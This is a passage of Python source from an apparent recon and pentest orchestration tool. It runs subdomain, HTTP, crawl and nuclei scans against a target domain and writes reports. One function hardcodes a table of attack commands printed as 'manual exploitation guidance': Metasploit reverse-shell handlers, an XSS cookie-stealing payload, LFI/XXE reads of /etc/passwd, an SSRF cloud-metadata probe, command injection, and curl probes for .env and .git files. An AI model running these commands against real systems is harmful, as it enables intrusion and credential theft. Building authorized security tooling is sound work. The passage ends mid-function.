from __future__ import annotations

from datetime import UTC, datetime
import json
import shutil
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt
from rich.table import Table

from neon_ape.agents.autoresearch import run_autoresearch
from neon_ape.agents.magi import run_magi_checklist
from neon_ape.commands.review import run_review
from neon_ape.commands.tools import (
    _discover_subdomains,
    _unique_targets,
    run_gobuster,
    run_projectdiscovery_batch_tool,
)
from neon_ape.db.repository import (
    domain_overview,
    list_checklist_items,
    mark_checklist_item_status,
    record_scan,
    review_overview,
)
from neon_ape.knowledge.graph import build_target_graph, lookup_prior_context
from neon_ape.obsidian_sync import resolve_vault_path, run_sync as run_obsidian_sync, sanitize_target_name
from neon_ape.reports.pdf_generator import generate_pdf_report
from neon_ape.tools.base import ToolResult, run_command
from neon_ape.tools.nuclei_helper import download_templates, nuclei_templates_path
from neon_ape.tools.projectdiscovery import parse_projectdiscovery_output
from neon_ape.ui.layout import build_adam_completion_panel, build_adam_intro_panel
from neon_ape.workflows.orchestrator import build_daily_report_dir, copy_daily_reports, is_macos, open_in_finder, speak_completion
ADAM_REQUIRED_TOOLS = ("subfinder", "httpx", "katana", "nuclei")
ADAM_NUCLEI_TIMEOUT = 180
ADAM_NUCLEI_SEVERITIES = "medium,high,critical"
ADAM_MEMORY_PATH = Path(__file__).resolve().parents[2] / ".cline.md"


def run_adam(
    console: Console,
    connection,
    *,
    config,
    detected_tools: dict[str, str],
    target: str | None = None,
    pdf_enabled: bool = False,
    autoresearch_enabled: bool = False,
    autoresearch_target: str | None = None,
    use_ffuf: bool = True,
    use_gobuster: bool = False,
) -> bool:
    console.print(build_adam_intro_panel())
    active_target = (target or "").strip()
    if not active_target:
        active_target = Prompt.ask("[bold red]Target domain[/bold red]")
    if not active_target:
        console.print("[bold red]Adam needs a target domain.[/bold red]")
        return False
    adam_memory = _load_adam_memory()
    _announce_mode(
        console,
        "Planner",
        [
            f"Target validated: {active_target}",
            "Methodology: local-only OSCP-style recon, review, and reporting",
            "Rule loaded: never auto-exploit; keep all guidance defensive and evidence-backed",
        ],
    )
    if adam_memory:
        console.print(
            Panel(
                "\n".join(f"- {line}" for line in adam_memory[:4]),
                title="Adam Memory (.cline.md)",
                border_style="magenta",
            )
        )

    prior_context = lookup_prior_context(connection, active_target, limit=5)
    _announce_mode(
        console,
        "Researcher",
        _format_prior_context(active_target, prior_context),
    )

    missing = [tool for tool in ADAM_REQUIRED_TOOLS if tool not in detected_tools]
    if use_ffuf and "ffuf" not in detected_tools and "gobuster" not in detected_tools:
        missing.append("ffuf")
    if use_gobuster and "gobuster" not in detected_tools:
        missing.append("gobuster")
    missing = list(dict.fromkeys(missing))
    if missing:
        console.print(f"[bold red]Adam cannot proceed. Missing tools:[/bold red] {', '.join(missing)}")
        return False

    console.print(f"[bold orange3]Hunting Angels across {active_target}...[/bold orange3]")
    _announce_mode(
        console,
        "Mapper / Enumerator",
        [
            "Running bounded active enumeration with prioritized web review",
            "Sequence: subfinder -> httpx -> katana -> ffuf/gobuster fallback -> nuclei",
        ],
    )
    with Progress(
        SpinnerColumn(style="bold red"),
        TextColumn("[bold orange3]{task.description}[/bold orange3]"),
        BarColumn(bar_width=28, style="red", complete_style="orange3"),
        console=console,
    ) as progress:
        task = progress.add_task("Adam is awakening Unit-01...", total=6)

        progress.update(task, description="Discovering subdomains")
        subdomains = _discover_subdomains(console, connection, target=active_target, scan_dir=config.scan_dir, workflow_name="pd_web_chain")
        progress.advance(task)
        if not subdomains:
            console.print("[bold yellow]Adam found no subdomains from subfinder. Falling back to the seed target.[/bold yellow]")
            subdomains = [active_target]

        progress.update(task, description="Probing live HTTP targets")
        httpx_success, httpx_findings = run_projectdiscovery_batch_tool(
            console,
            connection,
            tool_name="httpx",
            targets=subdomains,
            scan_dir=config.scan_dir,
            workflow_name=f"{active_target}_adam_httpx",
            history_target=f"adam:{active_target}:httpx",
        )
        progress.advance(task)
        if not httpx_success:
            return False

        live_http_targets = _unique_targets(finding.get("host", "") for finding in httpx_findings if finding.get("host"))
        if not live_http_targets:
            console.print("[bold yellow]Adam found no parsed live web targets from httpx. Falling back to the seed target URL.[/bold yellow]")
            live_http_targets = [f"https://{active_target}"]

        progress.update(task, description="Crawling reachable web paths")
        katana_success, katana_findings = run_projectdiscovery_batch_tool(
            console,
            connection,
            tool_name="katana",
            targets=live_http_targets,
            scan_dir=config.scan_dir,
            workflow_name=f"{active_target}_adam_katana",
            history_target=f"adam:{active_target}:katana",
        )
        progress.advance(task)
        if not katana_success:
            return False

        progress.update(task, description="Enumerating exposed directories")
        web_enum_success = True
        for http_target in live_http_targets:
            if not run_gobuster(
                console,
                connection,
                target=http_target,
                scan_dir=config.scan_dir,
                interactive_retry=False,
                use_ffuf=use_ffuf,
                force_gobuster=use_gobuster,
            ):
                web_enum_success = False
        progress.advance(task)
        if not web_enum_success:
            console.print("[bold yellow]Adam completed with partial web-path enumeration failures.[/bold yellow]")

        progress.update(task, description="Launching nuclei review")
        nuclei_targets = live_http_targets[:2]
        nuclei_success, _ = _run_adam_nuclei_review(
            console,
            connection,
            targets=nuclei_targets,
            scan_dir=config.scan_dir,
            workflow_name=f"{active_target}_adam_nuclei",
            history_target=f"adam:{active_target}:nuclei",
        )
        progress.advance(task)
        if not nuclei_success:
            console.print("[bold yellow]Adam completed with partial nuclei results.[/bold yellow]")

        progress.update(task, description="Analyzing the Paths")
        run_review(
            console,
            connection,
            target=active_target,
            limit=50,
            llm_triage=True,
            llm_provider=config.llm_provider,
            llm_model=config.llm_model,
            web_paths_only=True,
            llm_progress=False,
        )
        progress.advance(task)

    _announce_mode(
        console,
        "Assessor",
        ["Correlating findings, risk scores, and review evidence", "Preparing safe manual validation guidance only"],
    )
    vault_path = resolve_vault_path(None, config)
    overview = review_overview(connection, active_target, limit=100)
    highest_risk = max((int(item.get("risk_score", 0) or 0) for item in overview.get("angel_eyes", {}).get("items", [])), default=0)
    graph_state = build_target_graph(connection, active_target, limit=100)
    _render_graph_state(console, graph_state)
    _render_manual_validation_guidance(console, overview, highest_risk)
    if vault_path is None:
        console.print("[bold yellow]Adam could not resolve an Obsidian vault. Export will fall back to a local daily report folder.[/bold yellow]")
        daily_report_dir = build_daily_report_dir(active_target)
        daily_report_dir.mkdir(parents=True, exist_ok=True)
        findings_path = daily_report_dir / "Findings.md"
        sensitive_paths_path = daily_report_dir / "Sensitive-Paths.md"
        review_summary_path = daily_report_dir / "Review-Summary.md"
        _write_report_placeholder(findings_path, "Findings", active_target, highest_risk)
        _write_report_placeholder(sensitive_paths_path, "Sensitive Paths", active_target, highest_risk)
        _write_report_placeholder(review_summary_path, "Review Summary", active_target, highest_risk)
    else:
        console.print("[bold orange3]Synchronizing with Obsidian...[/bold orange3]")
        status = run_obsidian_sync(
            SimpleNamespace(
                vault_path=str(vault_path),
                target_note=active_target,
                notes_passphrase=None,
                limit=200,
                open=False,
                dry_run=False,
                skip_run=True,
            ),
            console=console,
        )
        if status != 0:
            console.print("[bold red]Adam finished recon, but Obsidian export failed.[/bold red]")
            return False
        target_dir = Path(vault_path) / "Pentests" / sanitize_target_name(active_target)
        findings_path = target_dir / "Findings.md"
        sensitive_paths_path = target_dir / "Sensitive-Paths.md"
        review_summary_path = target_dir / "Review-Summary.md"
        daily_report_dir = copy_daily_reports(active_target, [findings_path, sensitive_paths_path, review_summary_path])

    _seed_adam_completed_steps(connection)
    _announce_mode(
        console,
        "Reflector",
        _reflection_lines(graph_state, highest_risk, checklist_ready=True),
    )
    console.print("[bold orange3]Loading MAGI checklist sequence...[/bold orange3]")
    checklist_success = run_magi_checklist(
        console,
        connection,
        config=config,
        detected_tools=detected_tools,
        target=active_target,
        auto=True,
        prompt_manual=False,
        silent_completed=True,
    )
    refreshed_overview = _safe_domain_overview(connection, active_target, limit=5000)
    workflow_pdf_data = _build_workflow_pdf_data(
        connection,
        target=active_target,
        overview=refreshed_overview,
        checklist_items=_safe_checklist_items(connection),
        highest_risk=highest_risk,
    )
    pdf_path: Path | None = None
    if pdf_enabled:
        pdf_path = daily_report_dir / f"{datetime.now(UTC).date().isoformat()}-{sanitize_target_name(active_target)}-report.pdf"
        generate_pdf_report(
            pdf_path,
            title="Neon Ape Adam Report",
            subtitle=f"Target: {active_target}",
            summary_rows=(
                ("Target", active_target),
                ("Highest Risk", str(highest_risk)),
                ("Daily Folder", str(daily_report_dir)),
                ("Checklist Complete", "YES" if checklist_success else "PARTIAL"),
            ),
            sections=(
                ("Executive Summary", f"Adam completed the local workflow for {active_target}. Highest observed risk score: {highest_risk}."),
                ("Findings", _read_report_section(findings_path)),
                ("Sensitive Paths", _read_report_section(sensitive_paths_path)),
                ("Review Summary", _read_report_section(review_summary_path)),
            ),
            oracle_rows=(
                ("Highest risk", str(highest_risk), "Top Angel Eyes score observed in the current review overview"),
                ("Artifacts", "3", "Findings.md, Sensitive-Paths.md, and Review-Summary.md copied to the daily folder"),
                ("Checklist", "done" if checklist_success else "partial", "MAGI checklist auto-run status after Adam recon"),
            ),
            workflow_data=workflow_pdf_data,
        )
        if is_macos():
            subprocess.run(["open", str(pdf_path)], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if autoresearch_enabled:
        research_skill = autoresearch_target or ("angel-eyes" if highest_risk > 0 else "magi-checklist")
        console.print(f"[bold orange3]Adam is beginning autoresearch on {research_skill}. Persistent skill storage will be updated if the score improves enough.[/bold orange3]")
        run_autoresearch(
            console,
            config=config,
            skill_target=research_skill,
            daily_report_dir=daily_report_dir,
            auto=True,
        )
    _announce_mode(
        console,
        "Reporter",
        [
            f"Daily folder: {daily_report_dir}",
            "Prepared executive summary, review artifacts, and PDF if requested",
            "Manual review guidance is included; no exploit automation is ever performed",
        ],
    )
    # Render Metasploit guidance in Reporter mode as well
    overview_for_reporter = review_overview(connection, active_target, limit=100)
    reviews_for_reporter = overview_for_reporter.get("reviews", [])
    _render_metasploit_guidance(console, reviews_for_reporter)
    spoken_lines = speak_completion(highest_risk, checklist_complete=checklist_success)
    if is_macos():
        console.print("[bold orange3]Daniel voice notification:[/bold orange3]")
        for line in spoken_lines:
            console.print(f"- {line}")

    console.print(
        build_adam_completion_panel(
            target=active_target,
            highest_risk=highest_risk,
            findings_path=findings_path,
            sensitive_paths_path=sensitive_paths_path,
            review_summary_path=review_summary_path,
            daily_report_dir=daily_report_dir,
        )
    )
    console.print(f"[bold cyan]Daily report folder:[/bold cyan] {daily_report_dir}")
    if pdf_path is not None:
        console.print(f"[bold cyan]PDF report:[/bold cyan] {pdf_path}")
    _offer_open_results(console, findings_path, sensitive_paths_path, review_summary_path, daily_report_dir)
    return True


def _write_report_placeholder(path: Path, title: str, target: str, highest_risk: int) -> None:
    path.write_text(
        f"# {title}\n\n"
        f"- Target: `{target}`\n"
        f"- Highest risk score observed: `{highest_risk}`\n"
        "- Obsidian export was unavailable, so Adam wrote this local fallback artifact.\n",
        encoding="utf-8",
    )


def _read_report_section(path: Path) -> str:
    if not path.exists():
        return "Not available."
    return path.read_text(encoding="utf-8")[:4000]


def _seed_adam_completed_steps(connection) -> None:
    for step_order in (4, 7, 11, 12, 13):
        mark_checklist_item_status(connection, step_order, "done")


def _offer_open_results(
    console: Console,
    findings_path: Path,
    sensitive_paths_path: Path,
    review_summary_path: Path,
    daily_report_dir: Path,
) -> None:
    if is_macos():
        if not sys.stdin.isatty():
            console.print("[bold cyan]Press Enter to open the daily report folder in Finder[/bold cyan]")
            return
        console.input("[bold cyan]Press Enter to open the daily report folder in Finder[/bold cyan]")
        open_in_finder(daily_report_dir)
        return

    opener = shutil.which("xdg-open")
    if not opener:
        return
    command_hint = (
        f"xdg-open '{findings_path}'\n"
        f"xdg-open '{sensitive_paths_path}'\n"
        f"xdg-open '{review_summary_path}'"
    )
    if not sys.stdin.isatty():
        console.print(f"[bold cyan]Open results:[/bold cyan]\n{command_hint}")
        return
    answer = console.input("[bold cyan]Open exported review files with xdg-open?[/bold cyan] [y/N]: ").strip().lower()
    if answer not in {"y", "yes"}:
        console.print(f"[bold cyan]Open results later with:[/bold cyan]\n{command_hint}")
        return
    for path in (findings_path, sensitive_paths_path, review_summary_path):
        subprocess.run([opener, str(path)], check=False)


def _run_adam_nuclei_review(
    console: Console,
    connection,
    *,
    targets: list[str],
    scan_dir: Path,
    workflow_name: str,
    history_target: str,
) -> tuple[bool, list[dict[str, str]]]:
    normalized_targets = _unique_targets(targets)
    if not normalized_targets:
        return False, []
    output_path = scan_dir / f"nuclei_{workflow_name}.jsonl"
    input_path = scan_dir / f"nuclei_{workflow_name}.input.txt"
    input_path.write_text("\n".join(normalized_targets) + "\n", encoding="utf-8")
    command = [
        "nuclei",
        "-jsonl",
        "-severity",
        ADAM_NUCLEI_SEVERITIES,
        "-rl",
        "20",
        "-timeout",
        "5",
        "-l",
        str(input_path),
        "-o",
        str(output_path),
    ]
    console.print(
        f"[bold orange3]Adam is constraining nuclei for live orchestration:[/bold orange3] "
        f"{', '.join(normalized_targets)}"
    )
    templates_path, templates_message, templates_ready = download_templates()
    console.print(f"[bold cyan]{templates_message}[/bold cyan]")
    if not templates_ready:
        console.print(
            f"[bold yellow]Continuing with available nuclei templates from:[/bold yellow] {templates_path}"
        )
    command = [
        *command[:4],
        "-t",
        str(nuclei_templates_path()),
        *command[4:],
    ]
    try:
        result = run_command(
            "nuclei",
            history_target,
            command,
            timeout=ADAM_NUCLEI_TIMEOUT,
            raw_output_path=str(output_path),
        )
    finally:
        input_path.unlink(missing_ok=True)
    findings = parse_projectdiscovery_output("nuclei", output_path)
    record_scan(
        connection,
        ToolResult(
            tool_name="nuclei",
            target=history_target,
            command=command,
            stdout=result.stdout,
            stderr=result.stderr,
            exit_code=result.exit_code,
            raw_output_path=str(output_path),
        ),
        findings,
    )
    console.print(f"[bold green]nuclei exit code:[/bold green] {result.exit_code}")
    if result.exit_code != 0 and result.stderr:
        console.print(f"[bold yellow]{result.stderr}[/bold yellow]")
    return result.exit_code == 0, findings


def _load_adam_memory() -> list[str]:
    if not ADAM_MEMORY_PATH.exists():
        return []
    lines = []
    for raw_line in ADAM_MEMORY_PATH.read_text(encoding="utf-8").splitlines():
        stripped = raw_line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if stripped.startswith("- "):
            lines.append(stripped[2:])
        else:
            lines.append(stripped)
    return lines


def _announce_mode(console: Console, mode: str, lines: list[str]) -> None:
    console.print(
        Panel(
            "\n".join(f"- {line}" for line in lines),
            title=f"Adam Mode: {mode}",
            border_style="red",
        )
    )


def _format_prior_context(target: str, context: dict[str, object]) -> list[str]:
    prior_scans = context.get("prior_scans", [])
    prior_notes = context.get("prior_notes", [])
    lines = [f"Target scope seed: {target}"]
    if prior_scans:
        latest = prior_scans[:3]
        lines.append(f"Found {len(prior_scans)} prior local scan records with matching target context")
        for item in latest:
            lines.append(
                f"Recent: {item.get('tool_name', '-')} on {item.get('target', '-')} ({item.get('status', '-')})"
            )
    else:
        lines.append("No materially similar prior scan records found in the local graph yet")
    if prior_notes:
        lines.append(f"Found {len(prior_notes)} prior local note headers with matching context")
    else:
        lines.append("No prior matching note headers found")
    return lines


def _render_graph_state(console: Console, graph_state: dict[str, object]) -> None:
    summary = graph_state.get("summary", {})
    related_targets = graph_state.get("related_targets", [])
    table = Table(title="Adam Knowledge Graph", expand=False)
    table.add_column("Signal", style="bold magenta")
    table.add_column("Value", style="cyan")
    table.add_row("Hosts", str(summary.get("hosts", 0)))
    table.add_row("Services", str(summary.get("services", 0)))
    table.add_row("Paths", str(summary.get("paths", 0)))
    table.add_row("Reviews", str(summary.get("reviews", 0)))
    table.add_row("Nodes", str(len(graph_state.get("nodes", []))))
    table.add_row("Edges", str(len(graph_state.get("edges", []))))
    console.print(table)
    if related_targets:
        related = Table(title="Related Local Targets", expand=False)
        related.add_column("Target", style="bold orange3")
        related.add_column("Score")
        related.add_column("Shared Signals")
        for item in related_targets:
            shared = " | ".join(
                value
                for value in (
                    str(item.get("shared_products", "")),
                    str(item.get("shared_categories", "")),
                    str(item.get("shared_reviews", "")),
                )
                if value and value != "-"
            ) or "-"
            related.add_row(str(item.get("target", "-")), str(item.get("score", 0)), shared)
        console.print(related)


def _render_manual_validation_guidance(console: Console, overview: dict[str, object], highest_risk: int) -> None:
    lines = [
        f"Highest observed risk score: {highest_risk}",
        "Review the top-ranked Angel Eyes paths and confirm whether access controls are enforced consistently.",
        "Validate exposed services against observed versions and review findings before taking any manual follow-up action.",
        "Use remediation and evidence preservation notes from the report artifacts; Adam does not execute exploits.",
    ]
    reviews = overview.get("reviews", [])
    top_titles = [str(item.get("title") or item.get("finding_key") or "").strip() for item in reviews[:3] if isinstance(item, dict)]
    if top_titles:
        lines.append(f"Top review signals: {', '.join(title for title in top_titles if title)}")
    console.print(Panel("\n".join(f"- {line}" for line in lines), title="Manual Validation Guidance", border_style="orange3"))
    
    # Generate Metasploit manual exploitation guidance based on findings
    _render_metasploit_guidance(console, reviews)


def _render_metasploit_guidance(console: Console, reviews: list[dict[str, object]]) -> None:
    """Generate manual Metasploit exploitation guidance for identified vulnerabilities."""
    if not reviews:
        return
    
    # Map common vulnerability patterns to Metasploit modules and guidance
    vuln_mappings = {
        "sqli": {
            "module": "auxiliary/scanner/http/sqlmap",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "use auxiliary/scanner/http/sqlmap",
                "set RHOSTS <TARGET_IP>",
                "set TARGETURI <VULNERABLE_PATH>",
                "set THREADS 5",
                "run",
            ],
            "verification": "Check for SQL injection confirmation in module output",
            "caveats": "May cause database errors; test on non-production systems only",
        },
        "xss": {
            "module": "exploit/multi/browser/firefox_proto_crmfrequest",
            "payload": "N/A (client-side)",
            "commands": [
                "# For reflected XSS, use manual payload crafting",
                "# Example: <script>alert(document.cookie)</script>",
                "# Verify with browser developer tools",
            ],
            "verification": "Confirm script execution in browser context",
            "caveats": "XSS exploitation requires social engineering; document for remediation",
        },
        "rce": {
            "module": "exploit/multi/handler",
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "commands": [
                "use exploit/multi/handler",
                "set PAYLOAD linux/x64/meterpreter/reverse_tcp",
                "set LHOST <YOUR_IP>",
                "set LPORT 4444",
                "set ExitOnSession false",
                "exploit -j",
            ],
            "verification": "Wait for Meterpreter session; verify with 'sessions -l'",
            "caveats": "CRITICAL: Only test with explicit authorization; ensure scope compliance",
        },
        "lfi": {
            "module": "auxiliary/scanner/http/lfi",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual LFI testing with curl",
                "curl -v 'http://<TARGET>/page?file=../../../../etc/passwd'",
                "# Or use Burp Suite for automated testing",
            ],
            "verification": "Confirm file content disclosure in response",
            "caveats": "LFI can lead to RCE via log poisoning; document findings carefully",
        },
        "rfi": {
            "module": "exploit/unix/webapp/php_include",
            "payload": "php/meterpreter/reverse_tcp",
            "commands": [
                "use exploit/unix/webapp/php_include",
                "set RHOSTS <TARGET_IP>",
                "set TARGETURI <VULNERABLE_PATH>",
                "set PAYLOAD php/meterpreter/reverse_tcp",
                "set LHOST <YOUR_IP>",
                "exploit",
            ],
            "verification": "Check for Meterpreter session establishment",
            "caveats": "Requires PHP allow_url_include enabled; high detection risk",
        },
        "command_injection": {
            "module": "exploit/multi/handler",
            "payload": "cmd/unix/reverse_bash",
            "commands": [
                "# Manual command injection testing",
                "curl 'http://<TARGET>/vuln?cmd=;id'",
                "# For reverse shell:",
                "use exploit/multi/handler",
                "set PAYLOAD cmd/unix/reverse_bash",
                "set LHOST <YOUR_IP>",
                "set LPORT 4444",
                "exploit -j",
            ],
            "verification": "Confirm command execution output or shell session",
            "caveats": "CRITICAL: Command injection is high-risk; test with extreme caution",
        },
        "default_credentials": {
            "module": "auxiliary/scanner/http/tomcat_mgr_login",
            "payload": "N/A (credential testing)",
            "commands": [
                "use auxiliary/scanner/http/tomcat_mgr_login",
                "set RHOSTS <TARGET_IP>",
                "set RPORT 8080",
                "set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt",
                "run",
            ],
            "verification": "Check for successful login in module output",
            "caveats": "Credential testing may trigger account lockouts; coordinate with target owner",
        },
        "open_redirect": {
            "module": "N/A (manual testing)",
            "payload": "N/A",
            "commands": [
                "# Manual open redirect testing",
                "curl -v 'http://<TARGET>/redirect?url=https://evil.com'",
                "# Check for 302 redirect to external domain",
            ],
            "verification": "Confirm redirect to attacker-controlled domain",
            "caveats": "Open redirect alone is low-risk; document for phishing scenarios",
        },
        "ssrf": {
            "module": "auxiliary/scanner/http/ssrf",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual SSRF testing",
                "curl 'http://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/'",
                "# Test for internal network access",
            ],
            "verification": "Confirm internal service access or metadata disclosure",
            "caveats": "SSRF can access internal services; document all accessible endpoints",
        },
        "xxe": {
            "module": "auxiliary/scanner/http/xxe",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual XXE testing with malicious XML",
                "# Example payload:",
                '# <?xml version="1.0"?>',
                '# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                "# <foo>&xxe;</foo>",
            ],
            "verification": "Confirm file content disclosure in XML response",
            "caveats": "XXE can lead to SSRF and file disclosure; test carefully",
        },
        "deserialization": {
            "module": "exploit/multi/http/java_deserialization",
            "payload": "java/meterpreter/reverse_tcp",
            "commands": [
                "use exploit/multi/http/java_deserialization",
                "set RHOSTS <TARGET_IP>",
                "set TARGETURI <VULNERABLE_PATH>",
                "set PAYLOAD java/meterpreter/reverse_tcp",
                "set LHOST <YOUR_IP>",
                "exploit",
            ],
            "verification": "Check for Meterpreter session establishment",
            "caveats": "Deserialization exploits are highly destructive; test only with authorization",
        },
        "weak_ssl": {
            "module": "auxiliary/scanner/http/ssl_version",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "use auxiliary/scanner/http/ssl_version",
                "set RHOSTS <TARGET_IP>",
                "set RPORT 443",
                "run",
            ],
            "verification": "Check for deprecated SSL/TLS versions in output",
            "caveats": "SSL weaknesses are informational; document for compliance reporting",
        },
        "directory_traversal": {
            "module": "auxiliary/scanner/http/dir_scanner",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual directory traversal testing",
                "curl -v 'http://<TARGET>/../../etc/passwd'",
                "# Use Burp Suite Intruder for automated testing",
            ],
            "verification": "Confirm file system access beyond web root",
            "caveats": "Directory traversal can expose sensitive files; document all findings",
        },
        "secrets": {
            "module": "auxiliary/scanner/http/files",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual secrets/config file testing",
                "curl -v 'http://<TARGET>/.env'",
                "curl -v 'http://<TARGET>/config.local'",
                "curl -v 'http://<TARGET>/config.properties'",
                "# Check for sensitive data disclosure",
            ],
            "verification": "Confirm sensitive data (API keys, passwords, tokens) in response",
            "caveats": "Exposed secrets can lead to full system compromise; document all findings",
        },
        "config": {
            "module": "auxiliary/scanner/http/files",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual config file testing",
                "curl -v 'http://<TARGET>/.env'",
                "curl -v 'http://<TARGET>/config.local'",
                "curl -v 'http://<TARGET>/web.config'",
                "curl -v 'http://<TARGET>/php.ini'",
                "# Check for configuration disclosure",
            ],
            "verification": "Confirm configuration data (database credentials, API keys) in response",
            "caveats": "Exposed configuration can reveal system architecture; document all findings",
        },
        "svn": {
            "module": "auxiliary/scanner/http/svn_scanner",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual SVN metadata testing",
                "curl -v 'http://<TARGET>/.svn/entries'",
                "curl -v 'http://<TARGET>/.svn/wc.db'",
                "# Check for source code disclosure",
            ],
            "verification": "Confirm SVN metadata and potential source code disclosure",
            "caveats": "SVN exposure can reveal source code and credentials; document all findings",
        },
        "git": {
            "module": "auxiliary/scanner/http/git_scanner",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual Git metadata testing",
                "curl -v 'http://<TARGET>/.git/HEAD'",
                "curl -v 'http://<TARGET>/.git/config'",
                "# Check for source code disclosure",
            ],
            "verification": "Confirm Git metadata and potential source code disclosure",
            "caveats": "Git exposure can reveal source code and credentials; document all findings",
        },
        "logs": {
            "module": "auxiliary/scanner/http/files",
            "payload": "N/A (auxiliary module)",
            "commands": [
                "# Manual log file testing",
                "curl -v 'http://<TARGET>/access.log'",
                "curl -v 'http://<TARGET>/error.log'",
                "curl -v 'http://<TARGET>/development.log'",
                "# Check for sensitive information in logs",
            ],
            "verification": "Confirm log file content and potential sensitive information disclosure",
            "caveats": "Log files may contain credentials, session tokens, or system information",
        },
    }
    
    # Extract vulnerability types from reviews
    identified_vulns = []
    for review in reviews[:5]:  # Limit to top 5 findings
        if not isinstance(review, dict):
            continue
        title = str(review.get("title") or review.get("finding_key") or "").lower()
        description = str(review.get("description") or review.get("evidence") or "").lower()
        combined_text = f"{title} {description}"
        
        for vuln_type, guidance in vuln_mappings.items():
            if vuln_type in combined_text and vuln_type not in [v["type"] for v in identified_vulns]:
                identified_vulns.append({
                    "type": vuln_type,
                    "title": review.get("title") or review.get("finding_key") or vuln_type.upper(),
                    **guidance,
                })
    
    if not identified_vulns:
        return
    
    # Render Metasploit guidance panel
    guidance_lines = ["Manual exploitation steps (never auto-run):", ""]
    
    for vuln in identified_vulns[:3]:  # Limit to top 3 for readability
        guidance_lines.append(f"═══ {vuln['title']} ═══")
        guidance_lines.append(f"Metasploit Module: {vuln['module']}")
        guidance_lines.append(f"Recommended Payload: {vuln['payload']}")
        guidance_lines.append("")
        guidance_lines.append("Commands:")
        for cmd in vuln["commands"]:
            guidance_lines.append(f"  {cmd}")
        guidance_lines.append("")
        guidance_lines.append(f"Verification: {vuln['verification']}")
        guidance_lines.append(f"⚠️  Caveats: {vuln['caveats']}")
        guidance_lines.append("")
    
    guidance_lines.append("⚠️  IMPORTANT WARNINGS:")
    guidance_lines.append("  • NEVER run exploits without explicit written authorization")
    guidance_lines.append("  • Always verify scope and rules of engagement before testing")
    guidance_lines.append("  • Use isolated test environments when possible")
    guidance_lines.append("  • Document all actions for audit trail and reporting")
    guidance_lines.append("  • Stop immediately if unexpected system behavior occurs")
    
    console.print(
        Panel(
            "\n".join(guidance_lines),
            title="Metasploit Manual Exploitation Guidance",
            border_style="red",
        )
    )


def _reflection_lines(graph_state: dict[str, object], highest_risk: int, *, checklist_ready: bool) -> list[str]:
    related_targets = graph_state.get("related_targets", [])
    lines = [
        f"Knowledge graph refreshed from the latest local evidence set (highest risk: {highest_risk})",
        "This run can feed future autoresearch and operator review without changing scope",
    ]
    if related_targets:
        first = related_targets[0]
        lines.append(f"Closest prior local match: {first.get('target', '-')} (score {first.get('score', 0)})")
    else:
        lines.append("No strong prior local analog found in the graph")
    lines.append("MAGI checklist is ready for final execution" if checklist_ready else "MAGI checklist deferred")
    return lines


def _build_workflow_pdf_data(
    connection,
    *,
    target: str,
    overview: dict[str, object],
    checklist_items: list[dict[str, object]],
    highest_risk: int,
) -> dict[str, object]:
    return {
        "target": target,
        "highest_risk": highest_risk,
        "service_inventory": [dict(item) for item in overview.get("inventory", []) if isinstance(item, dict)],
        "nmap_results": _query_nmap_results(connection, target),
        "nuclei_findings": _query_nuclei_findings(connection, target),
        "sensitive_paths": [dict(item) for item in overview.get("angel_eyes", {}).get("items", []) if isinstance(item, dict)],
        "magi_checklist": [dict(item) for item in checklist_items],
        "raw_findings": _query_raw_findings(connection, target),
        "ffuf_summary": overview.get("web_paths", {}).get("ffuf", []) if isinstance(overview.get("web_paths"), dict) else [],
        "passive_recon": _query_passive_recon_results(connection, target),
        "recommendations": _build_report_recommendations(overview, checklist_items, highest_risk),
    }


def _query_nmap_results(connection, target: str) -> list[dict[str, object]]:
    if not hasattr(connection, "execute"):
        return []
    pattern = f"%{target}%"
    rows = connection.execute(
        """
        SELECT sf.key, sf.value, sf.metadata_json, sr.finished_at
        FROM scan_findings sf
        JOIN scan_runs sr ON sr.id = sf.scan_run_id
        WHERE sr.tool_name = 'nmap'
          AND sr.target LIKE ?
          AND sf.finding_type = 'port'
        ORDER BY sf.id DESC
        """,
        (pattern,),
    ).fetchall()
    results: list[dict[str, object]] = []
    for row in rows:
        metadata = _load_metadata_json(row["metadata_json"])
        results.append(
            {
                "host": str(metadata.get("host", "")),
                "port": str(metadata.get("key", row["key"])),
                "protocol": str(metadata.get("protocol", "")),
                "service_name": str(metadata.get("service_name", "")),
                "product": str(metadata.get("product", "")),
                "version": str(metadata.get("version", "")),
                "banner": str(metadata.get("extrainfo", "")),
                "summary": str(row["value"]),
                "finished_at": str(row["finished_at"] or ""),
            }
        )
    return results


def _query_nuclei_findings(connection, target: str) -> list[dict[str, object]]:
    if not hasattr(connection, "execute"):
        return []
    pattern = f"%{target}%"
    rows = connection.execute(
        """
        SELECT sf.key, sf.value, sf.metadata_json, sr.finished_at
        FROM scan_findings sf
        JOIN scan_runs sr ON sr.id = sf.scan_run_id
        WHERE sr.tool_name = 'nuclei'
          AND sr.target LIKE ?
          AND sf.finding_type = 'nuclei_finding'
        ORDER BY sf.id DESC
        """,
        (pattern,),
    ).fetchall()
    findings: list[dict[str, object]] = []
    for row in rows:
        metadata = _load_metadata_json(row["metadata_json"])
        findings.append(
            {
                "template_id": str(metadata.get("template_id", row["key"])),
                "name": str(metadata.get("name", "")),
                "severity": str(metadata.get("severity", "")),
                "matched_at": str(metadata.get("host", "")),
                "matcher_name": str(metadata.get("matcher_name", "")),
                "summary": str(row["value"]),
                "finished_at": str(row["finished_at"] or ""),
            }
        )
    return findings


def _query_raw_findings(connection, target: str) -> list[dict[str, object]]:
